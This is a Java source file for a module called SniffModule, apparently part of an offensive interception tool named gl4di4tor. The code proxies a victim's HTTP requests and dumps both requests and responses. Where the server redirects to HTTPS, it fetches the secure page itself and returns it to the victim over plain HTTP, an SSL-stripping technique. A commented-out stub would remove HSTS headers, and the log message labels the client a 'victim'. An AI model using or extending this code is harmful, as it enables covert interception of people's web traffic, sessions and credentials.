package gl4di4tor.module.sniff;

import gl4di4tor.configuration.Config;
import gl4di4tor.log.LogService;
import gl4di4tor.module.BaseModule;
import gl4di4tor.net.channel.OutgoingChannel;
import gl4di4tor.net.channel.SSLOutgoingChannel;
import gl4di4tor.net.http.HttpRequest;
import gl4di4tor.net.http.HttpResponse;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

/**
 * Created by gladiator on 8/15/17.
 */
public class SniffModule extends BaseModule {

    public SniffModule(Socket socket) {
        super(socket);
    }

    @Override
    public void execute() {
        HttpRequest httpRequest = null;
        byte[] socketData = new byte[32768];
        int dataLen = 0;
        try {
            dataLen = readData(socketData);
            dumpData(socketData);
            httpRequest = new HttpRequest(new String(socketData));
        } catch (Exception ex) {
            //ignore me;
        }

        if (httpRequest == null) {
            return;
        }
        socketData = removeKeepAliveHeader(socketData);
        byte[] response = new OutgoingChannel(httpRequest.getHeaderParam("Host"), this.socket, socketData, dataLen,
                OutgoingChannel.ChannelMode.BLOCKING).execute();
        if (response == null) {
            return;
        }
        dumpData(response);
        HttpResponse serverResponse;
        try {
            serverResponse = new HttpResponse(new String(response));
            if (serverResponse.isRedirectToSSL() && Config.getInstance().isSslEnable()) {
                response = new SSLOutgoingChannel(serverResponse.getHeaderParam("Location"), socketData,
                        dataLen).execute();
                if (response == null) {
                    return;
                }
                dumpData(response);
//                serverResponse = new HttpResponse(new String(response));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

//        String preProcessing = new String(response);
        //Fixme: test this method.
//        response = removeHSTSHeader(response);
//        String postProcessing = new String(response);

        try {
            final OutputStream outToClient = this.socket.getOutputStream();
            outToClient.write(response, 0, response.length);
            outToClient.flush();
            this.socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        try {
            LogService.info("Sniffing victim " + this.socket.getRemoteSocketAddress());
        } catch (Exception e) {
            LogService.error(e);
        }
        execute();
    }
}
